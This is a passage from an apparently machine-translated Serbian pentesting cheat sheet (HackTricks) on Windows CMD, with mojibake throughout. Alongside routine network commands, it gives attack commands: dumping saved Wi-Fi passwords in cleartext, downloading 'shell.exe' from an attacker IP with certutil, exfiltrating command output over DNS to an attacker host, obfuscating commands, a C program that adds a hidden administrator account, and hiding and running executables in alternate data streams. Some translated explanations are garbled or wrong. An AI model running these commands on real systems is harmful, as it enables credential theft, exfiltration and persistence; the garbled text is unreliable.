Zamenite "network\_name" sa imenom mreÅ¾e sa kojom Å¾elite da se poveÅ¾ete.

#### Disconnect from a Network

#### Odjavljivanje sa mreÅ¾e

To disconnect from a wifi network, use the following command:

Da biste se odjavili sa beÅ¾iÄne mreÅ¾e, koristite sledeÄ‡u komandu:

```plaintext
netsh wlan disconnect
```

#### View Network Profiles

#### Pregled profila mreÅ¾e

To view the saved network profiles, use the following command:

Da biste videli saÄuvane profile mreÅ¾e, koristite sledeÄ‡u komandu:

```plaintext
netsh wlan show profiles
```

#### Delete a Network Profile

#### Brisanje profila mreÅ¾e

To delete a saved network profile, use the following command:

Da biste obrisali saÄuvani profil mreÅ¾e, koristite sledeÄ‡u komandu:

```plaintext
netsh wlan delete profile name="profile_name"
```

Replace "profile\_name" with the name of the profile you want to delete.

Zamenite "profile\_name" sa imenom profila koji Å¾elite da obriÅ¡ete.

```bash
netsh wlan show profile #AP SSID
netsh wlan show profile <SSID> key=clear #Get Cleartext Pass
```

### SNMP

SNMP (Simple Network Management Protocol) je protokol koji se koristi za upravljanje i nadzor mreÅ¾nih ureÄ‘aja. OmoguÄ‡ava administratorima da prikupljaju informacije o statusu i performansama mreÅ¾e, kao i da upravljaju mreÅ¾nim ureÄ‘ajima. SNMP koristi poruke za komunikaciju izmeÄ‘u upravljaÄke stanice i upravljanih ureÄ‘aja. Ove poruke se Å¡alju preko UDP (User Datagram Protocol) protokola na portu 161. SNMP podrÅ¾ava razliÄite operacije, ukljuÄujuÄ‡i Äitanje i pisanje vrednosti, kao i praÄ‡enje dogaÄ‘aja.

```
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
```

### MreÅ¾ni interfejsi

#### Pregled dostupnih mreÅ¾nih interfejsa

Da biste pregledali dostupne mreÅ¾ne interfejse na Windows operativnom sistemu, moÅ¾ete koristiti sledeÄ‡u komandu:

```plaintext
ipconfig
```

Ova komanda Ä‡e prikazati informacije o svim aktivnim mreÅ¾nim interfejsima, ukljuÄujuÄ‡i IP adresu, podmreÅ¾nu masku, podrazumevani gateway i druge relevantne informacije.

#### Promena IP adrese

Da biste promenili IP adresu mreÅ¾nog interfejsa, moÅ¾ete koristiti sledeÄ‡u komandu:

```plaintext
netsh interface ip set address "Naziv interfejsa" static IP_adresa PodmreÅ¾na_maska Gateway
```

Zamenite "Naziv interfejsa" sa imenom interfejsa koji Å¾elite da promenite, "IP\_adresa" sa Å¾eljenom IP adresom, "PodmreÅ¾na\_maska" sa odgovarajuÄ‡om podmreÅ¾nom maskom i "Gateway" sa podrazumevanim gateway-om.

#### Promena DNS servera

Da biste promenili DNS servere za odreÄ‘eni mreÅ¾ni interfejs, moÅ¾ete koristiti sledeÄ‡u komandu:

```plaintext
netsh interface ip set dns "Naziv interfejsa" static DNS_server_primarni
```

Zamenite "Naziv interfejsa" sa imenom interfejsa koji Å¾elite da promenite i "DNS\_server\_primarni" sa IP adresom primarnog DNS servera.

#### IskljuÄivanje mreÅ¾nog interfejsa

Da biste iskljuÄili odreÄ‘eni mreÅ¾ni interfejs, moÅ¾ete koristiti sledeÄ‡u komandu:

```plaintext
netsh interface set interface "Naziv interfejsa" admin=disable
```

Zamenite "Naziv interfejsa" sa imenom interfejsa koji Å¾elite da iskljuÄite.

#### UkljuÄivanje mreÅ¾nog interfejsa

Da biste ukljuÄili odreÄ‘eni mreÅ¾ni interfejs, moÅ¾ete koristiti sledeÄ‡u komandu:

```plaintext
netsh interface set interface "Naziv interfejsa" admin=enable
```

Zamenite "Naziv interfejsa" sa imenom interfejsa koji Å¾elite da ukljuÄite.

```bash
ipconfig /all
```

### ARP tabela

ARP (Address Resolution Protocol) tabela je tabela koja se koristi u mreÅ¾nom okruÅ¾enju kako bi se mapirale IP adrese na MAC adrese. Ova tabela omoguÄ‡ava ureÄ‘ajima da komuniciraju na lokalnoj mreÅ¾i. Kada se ureÄ‘aj poveÅ¾e na mreÅ¾u, on Å¡alje ARP zahtev kako bi saznao MAC adresu drugog ureÄ‘aja na istoj mreÅ¾i. Ova tabela se Äesto koristi u napadima na mreÅ¾u kako bi se izvrÅ¡io ARP spoofing ili ARP poisoning.

```bash
arp -A
```

## Preuzimanje

Bitsadmin.exe

```
bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1
```

CertReq.exe je alatka koja se koristi za generisanje i upravljanje zahtevima za sertifikate u operativnom sistemu Windows. Ova komanda omoguÄ‡ava korisnicima da kreiraju CSR (Certificate Signing Request) datoteke koje se koriste za dobijanje digitalnih sertifikata od sertifikacionih tela. CSR datoteke sadrÅ¾e informacije o subjektu za koga se zahteva sertifikat, kao i javni kljuÄ koji Ä‡e biti ukljuÄen u sertifikat. CertReq.exe takoÄ‘e omoguÄ‡ava korisnicima da izdaju, povuku i obnove sertifikate. Ova alatka je korisna za pentestere koji Å¾ele da manipuliÅ¡u sertifikatima u cilju testiranja sigurnosti sistema.

```
CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt
```

Certutil.exe je alat koji se koristi za rad sa digitalnim certifikatima u operativnom sistemu Windows. Ovaj alat omoguÄ‡ava korisnicima da pregledaju, izdaju, povuku, izvoze i uvoze certifikate, kao i da obavljaju druge operacije vezane za upravljanje certifikatima. Certutil.exe se Äesto koristi u procesu hardeninga sistema kako bi se osigurala sigurnost i integritet digitalnih certifikata.

```
certutil.exe -urlcache -split -f "http://10.10.14.13:8000/shell.exe" s.exe
```

**PronaÄ‘ite joÅ¡ mnogo toga pretraÅ¾ivanjem `Download` na** [**https://lolbas-project.github.io**](https://lolbas-project.github.io/)

## Razno

```bash
cd #Get current dir
cd C:\path\to\dir #Change dir
dir #List current dir
dir /a:h C:\path\to\dir #List hidden files
dir /s /b #Recursive list without shit
time #Get current time
date #Get current date
shutdown /r /t 0 #Shutdown now
type <file> #Cat file

#Runas
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe" #Use saved credentials
runas /netonly /user:<DOMAIN>\<NAME> "cmd.exe" ::The password will be prompted

#Hide
attrib +h file #Set Hidden
attrib -h file #Quit Hidden

#Give full control over a file that you owns
icacls <FILE_PATH> /t /e /p <USERNAME>:F
icacls <FILE_PATH> /e /r <USERNAME> #Remove the permision

#Recursive copy to smb
xcopy /hievry C:\Users\security\.yawcam \\10.10.14.13\name\win

#exe2bat to transform exe file in bat file

#ADS
dir /r #Detect ADS
more file.txt:ads.txt #read ADS
powershell (Get-Content file.txt -Stream ads.txt)

# Get error messages from code
net helpmsg 32 #32 is the code in that case
```

### ZaobilaÅ¾enje zabrane koriÅ¡Ä‡enja odreÄ‘enih karaktera

Kada se susretnete sa zabranom koriÅ¡Ä‡enja odreÄ‘enih karaktera prilikom izvrÅ¡avanja komandi, moÅ¾ete primeniti sledeÄ‡e tehnike za zaobilaÅ¾enje ove zabrane:

1. Koristite alternativne karaktere: Umesto zabranjenih karaktera, moÅ¾ete koristiti sliÄne karaktere koji nisu zabranjeni. Na primer, umesto slova "o" moÅ¾ete koristiti broj "0" ili umesto slova "s" moÅ¾ete koristiti simbol "$".
2. Koristite heksadecimalnu reprezentaciju: Umesto zabranjenih karaktera, moÅ¾ete koristiti njihovu heksadecimalnu reprezentaciju. Na primer, umesto slova "a" moÅ¾ete koristiti "\x61".
3. Koristite Unicode reprezentaciju: Umesto zabranjenih karaktera, moÅ¾ete koristiti njihovu Unicode reprezentaciju. Na primer, umesto slova "b" moÅ¾ete koristiti "\u0062".
4. Koristite escape sekvence: Umesto zabranjenih karaktera, moÅ¾ete koristiti escape sekvence. Na primer, umesto znaka za novi red "\n" moÅ¾ete koristiti "\r\n".
5. Koristite konkatenaciju: Umesto zabranjenih karaktera, moÅ¾ete koristiti konkatenaciju viÅ¡e dozvoljenih karaktera kako biste dobili Å¾eljeni rezultat. Na primer, umesto karaktera "e" moÅ¾ete koristiti "ex" ili "ee".

KoriÅ¡Ä‡enjem ovih tehnika, moÅ¾ete zaobiÄ‡i zabranu koriÅ¡Ä‡enja odreÄ‘enih karaktera i uspeÅ¡no izvrÅ¡iti komande.

```bash
echo %HOMEPATH:~6,-11%   #\
who^ami   #whoami
```

### DOSfuscation

GeneriÅ¡e obfuskiranu CMD liniju

```powershell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
help
SET COMMAND type C:\Users\Administrator\Desktop\flag.txt
encoding
```

### ACL-ovi adresa za sluÅ¡anje

MoÅ¾ete sluÅ¡ati na [http://+:80/Temporary\_Listen\_Addresses/](http://+/Temporary\_Listen\_Addresses/) bez potrebe za administratorskim pravima.

```bash
netsh http show urlacl
```

### RuÄni DNS shell

**NapadaÄ** (Kali) mora koristiti jednu od ove 2 opcije:

```bash
sudo responder -I <iface> #Active
sudo tcpdump -i <iface> -A proto udp and dst port 53 and dst ip <KALI_IP> #Passive
```

#### Å½rtva

**Tehnika `for /f tokens`**: Ovo nam omoguÄ‡ava da izvrÅ¡imo komande, dobijemo prvih X reÄi svake linije i poÅ¡aljemo ih preko DNS-a na naÅ¡ server.

```bash
for /f %a in ('whoami') do nslookup %a <IP_kali> #Get whoami
for /f "tokens=2" %a in ('echo word1 word2') do nslookup %a <IP_kali> #Get word2
for /f "tokens=1,2,3" %a in ('dir /B C:\') do nslookup %a.%b.%c <IP_kali> #List folder
for /f "tokens=1,2,3" %a in ('dir /B "C:\Program Files (x86)"') do nslookup %a.%b.%c <IP_kali> #List that folder
for /f "tokens=1,2,3" %a in ('dir /B "C:\Progra~2"') do nslookup %a.%b.%c <IP_kali> #Same as last one
#More complex commands
for /f "tokens=1,2,3,4,5,6,7,8,9" %a in ('whoami /priv ^| findstr /i "enable"') do nslookup %a.%b.%c.%d.%e.%f.%g.%h.%i <IP_kali> #Same as last one
```

TakoÄ‘e moÅ¾ete **preusmeriti** izlaz, a zatim ga **proÄitati**.

```
whoami /priv | finstr "Enab" > C:\Users\Public\Documents\out.txt
for /f "tokens=1,2,3,4,5,6,7,8,9" %a in ('type "C:\Users\Public\Documents\out.txt"') do nslookup %a.%b.%c.%d.%e.%f.%g.%h.%i <IP_kali>
```

## Pozivanje CMD-a iz C koda

Da biste pozvali CMD (Command Prompt) iz C koda, moÅ¾ete koristiti funkciju `system()`. Ova funkcija omoguÄ‡ava izvrÅ¡avanje CMD komandi iz C programa.

Evo jednostavnog primera kako koristiti `system()` funkciju:

```c
#include <stdlib.h>

int main() {
    system("cmd /c <komanda>");
    return 0;
}
```

U ovom primeru, `<komanda>` treba zameniti sa Å¾eljenom CMD komandom koju Å¾elite da izvrÅ¡ite. Na primer, ako Å¾elite da izvrÅ¡ite komandu `ipconfig`, vaÅ¡ kod bi izgledao ovako:

```c
#include <stdlib.h>

int main() {
    system("cmd /c ipconfig");
    return 0;
}
```

Kada pokrenete ovaj program, CMD Ä‡e biti pozvan i izvrÅ¡iÄ‡e se komanda `ipconfig`. MoÅ¾ete koristiti bilo koju drugu CMD komandu na isti naÄin.

VaÅ¾no je napomenuti da koriÅ¡Ä‡enje `system()` funkcije moÅ¾e predstavljati sigurnosni rizik, posebno ako se korisniÄki unos direktno prosleÄ‘uje kao argument komande. Uvek budite oprezni prilikom rukovanja korisniÄkim unosima kako biste izbegli potencijalne ranjivosti.

```c
#include <stdlib.h>     /* system, NULL, EXIT_FAILURE */

// When executed by Administrator this program will create a user and then add him to the administrators group
// i686-w64-mingw32-gcc addmin.c -o addmin.exe
// upx -9 addmin.exe

int main (){
int i;
i=system("net users otherAcc 0TherAcc! /add");
i=system("net localgroup administrators otherAcc /add");
return 0;
}
```

## Ğ¨Ğ¿Ğ°Ñ€Ğ°Ğ»Ğ°Ğ½ĞºĞ° Ğ·Ğ° Ğ°Ğ»Ñ‚ĞµÑ€Ğ½Ğ°Ñ‚Ğ¸Ğ²Ğ½Ğµ Ğ¿Ğ¾Ğ´Ğ°Ñ‚ĞºĞ¾Ğ²Ğ½Ğµ Ñ‚Ğ¾ĞºĞ¾Ğ²Ğµ (ADS/Alternate Data Stream)

**ĞŸÑ€Ğ¸Ğ¼ĞµÑ€Ğ¸ Ğ¿Ñ€ĞµÑƒĞ·ĞµÑ‚Ğ¸ ÑĞ°** [**https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f**](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)**. Ğ˜Ğ¼Ğ° Ğ¸ Ğ¼Ğ½Ğ¾Ğ³Ğ¾ Ğ´Ñ€ÑƒĞ³Ğ¸Ñ…!**

```bash
## Selected Examples of ADS Operations ##

### Adding Content to ADS ###
# Append executable to a log file as an ADS
type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"
# Download a script directly into an ADS
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt

### Discovering ADS Content ###
# List files and their ADS
dir /R
# Use Sysinternals tool to list ADS of a file
streams.exe <c:\path\to\file>

### Extracting Content from ADS ###
# Extract an executable stored in an ADS
expand c:\ads\file.txt:test.exe c:\temp\evil.exe

### Executing ADS Content ###
# Execute an executable stored in an ADS using WMIC
wmic process call create '"C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"'
# Execute a script stored in an ADS using PowerShell
powershell -ep bypass - < c:\temp:ttt
```

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **cybersecurity kompaniji**? Å½elite li da vidite svoju **kompaniju reklamiranu na HackTricks-u**? Ili Å¾elite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **PridruÅ¾ite se** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
